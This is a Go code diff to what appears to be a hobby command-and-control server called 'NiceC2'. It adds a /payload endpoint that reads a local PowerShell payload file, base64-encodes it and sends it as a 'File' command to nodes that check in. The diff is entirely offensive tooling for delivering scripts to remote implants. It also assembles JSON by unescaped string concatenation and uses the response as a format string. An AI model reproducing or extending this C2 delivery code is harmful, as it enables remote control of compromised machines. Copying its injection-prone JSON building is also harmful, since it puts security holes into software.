@@ -1,6 +1,7 @@
 package main
 
 import (
+	b64 "encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
@@ -62,6 +63,31 @@ func nodeCheckIn(w http.ResponseWriter, req *http.Request) {
 
 }
 
+func nodeSendFile(w http.ResponseWriter, req *http.Request) {
+
+	// Decode the json body
+	decoder := json.NewDecoder(req.Body)
+	var node node_check_in
+	err := decoder.Decode(&node)
+	if err != nil {
+		panic(err)
+	}
+
+	script := read_script("payloads/PowerShell.ps1")
+
+	var response = []byte(`
+	{
+		"ID": "` + node.ID + `",
+		"command": "File",
+		"details": "` + script + `"
+	}`)
+
+	fmt.Println(response)
+
+	fmt.Fprintf(w, string(response))
+
+}
+
 func handleRequests() {
 
 	myRouter := mux.NewRouter().StrictSlash(true)
@@ -71,6 +97,8 @@ func handleRequests() {
 	// myRouter.HandleFunc("/test", shrug).Methods("GET")
 	myRouter.HandleFunc("/checkin", nodeCheckIn).Methods("POST")
 
+	myRouter.HandleFunc("/payload", nodeSendFile).Methods("POST")
+
 	log.Fatal(http.ListenAndServe(":8081", myRouter))
 }
 
@@ -79,6 +107,7 @@ func main() {
 	fmt.Println("NiceC2 server")
 
 	handleRequests()
+
 }
 
 func shrug() {
@@ -106,7 +135,8 @@ func read_script(path string) string {
 	fmt.Println(script)
 
 	// here is where we turn the file into some nice data I think
+	encoded_script := b64.StdEncoding.EncodeToString([]byte(script))
 
-	return script
+	return encoded_script
 
 }
